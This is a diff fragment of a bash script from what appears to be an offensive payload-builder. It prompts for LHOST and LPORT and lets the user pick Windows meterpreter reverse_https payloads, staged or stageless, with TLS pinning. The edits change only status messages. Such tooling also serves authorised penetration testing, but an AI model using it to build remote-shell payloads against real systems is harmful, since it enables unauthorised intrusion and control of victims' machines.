@@ -308,7 +308,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     # Create a Paranoid Payload (staged payload)
     # For this use case, we will combine Payload UUID tracking with TLS pinning.
     #
-    echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
+    echo ${BlueF}[☠]${white} Building staged payload.$DEFAULT_EXT ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
@@ -415,6 +415,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
 
 
 
+
 #
 # Stageless payload build (exe output)
 #
@@ -425,7 +426,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     # Chose payload to use Building a stageless agent ..
     #
     cd $IPATH/output
-    echo ${BlueF}[☠]${white} Building stageless payload ..${BlueF};
+    echo ${BlueF}[☠]${white} Building stageless payload.exe ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 220) > /dev/null 2>&1
